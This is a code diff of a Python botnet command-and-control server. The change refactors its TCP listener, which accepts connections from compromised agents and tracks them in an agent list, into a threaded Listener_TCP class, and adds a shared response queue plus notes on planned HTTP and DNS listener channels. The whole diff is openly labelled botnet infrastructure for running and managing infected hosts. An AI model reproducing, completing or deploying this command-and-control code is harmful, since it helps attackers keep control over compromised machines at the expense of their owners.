@@ -10,47 +10,33 @@ import queue
 import time
 
 # Project imports
-from handler import Handler
 from interpreter import Interpreter
-# from interpreter import Interpreter
-# from handler import Handler
+from listener_tcp import Listener_TCP
 
-agentList = []      # Stores client_address[] info (IP, Port): IP is stored in string format, port is not
-                    # [Handler-ID]-[client_address]-[ IP ]
-                    #            |                L-[Port]
-                    #            L-[CMD_Queue]
 
-def listener(lhost, lport):
+agentList = []                  # Stores client_address[] info (IP, Port): IP is stored in string format, port is not
 
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server_address = (lhost, lport)
-    server.bind(server_address)
-    server.listen(100)
+                                # [Handler-ID]-[client_address]-[ IP ]
+                                #            |                L-[Port]
+                                #            L-[CMD_Queue]
 
-    print(f"[* Listener] Starting Botnet listener on tcp://{lhost}:{str(lport)}\n")
+listeners = []                  # Handles all listeneing threads (TCP, HTTP, DNS, etc...)
+                                # Ensuring that information can be passed between them and allowing for easier management
 
-    InterpreterThread = Interpreter(agentList)          # Handles interface, queue is for commands
-    InterpreterThread.start()
-
-    connRecord = 0                                         # Records Connection ID
-
-    while True:
-
-        (client, client_address) = server.accept()  # start listening
-        print(f"\n[* Listener-Msg] Connection received from {str(client_address[0])}\n")
-
-        # BotHandler = Multiconn, a new BotHandler is spawned for each incoming connection
-        newConn = Handler(client, client_address, connRecord)
-        newConn.start()
-
-        agentList.append(newConn)
-        print(agentList)
-        connRecord += 1
+responseQueue = queue.Queue()   # Single queue for handling all responses sent from each respective listeners
+                                # Idea: Add identification to each message (like a header) to ensure that the 
+                                # message allocates itself to the server output correctly
 
 # -------------------------------------------------------------------------------------------
 
-#import
+# TODO
+#      - Test Kill function
+#      - Reimplement queues
+
+
+
+
+
 def main():
 
     # batchList = []              # List for systems that are being interacted with in BatchMode
@@ -64,9 +50,14 @@ def main():
         print(f"[* Interpreter-Msg] Usage:\n  [+] python3 {sys.argv[0]} <LHOST> <LPORT>\n  [+] Eg.: python3 {sys.argv[0]} 0.0.0.0 1337\n")
     else:
         try:
-            lhost=sys.argv[1]
-            lport=int(sys.argv[2])
-            listener(lhost, lport)
+            lhost = sys.argv[1]
+            lport = int(sys.argv[2])
+
+            TCP_Thread = Listener_TCP(lhost, lport, agentList, responseQueue)
+            TCP_Thread.start()
+
+            InterpreterThread = Interpreter(agentList, listeners, responseQueue)          # Handles interface, queue is for commands
+            InterpreterThread.start()
         except Exception as ex:
             print(f"[* Interpreter-Msg] Unable to establish the Handler. Error: {str(ex)}\n")
 
